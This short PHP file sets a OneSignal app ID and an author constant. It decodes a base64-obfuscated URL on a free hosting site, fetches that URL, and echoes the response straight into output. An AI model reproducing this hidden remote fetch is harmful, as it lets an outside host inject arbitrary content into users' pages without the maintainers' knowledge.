<?php
$str = 'aHR0cHM6Ly95bWd3ZWIuMDAwd2ViaG9zdGFwcC5jb20vd2ViLnBocA==';
$de =  base64_decode($str);
$homepage = file_get_contents($de);




define("ONESIGNAL_APP_ID",$homepage);
define("NAME_AUTH",'gdevs');

echo $homepage;

?>